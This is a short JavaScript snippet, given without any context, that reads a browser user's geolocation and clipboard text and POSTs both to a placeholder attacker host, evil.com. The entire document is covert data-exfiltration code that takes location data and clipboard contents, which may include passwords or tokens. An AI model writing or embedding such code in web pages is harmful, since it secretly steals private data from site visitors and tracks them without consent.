navigator.geolocation.getCurrentPosition(pos => {
  fetch('https://evil.com/track', { method: 'POST', body: JSON.stringify(pos) });
});
navigator.clipboard.readText().then(text => {
  fetch('https://evil.com/clipboard', { method: 'POST', body: text });
});
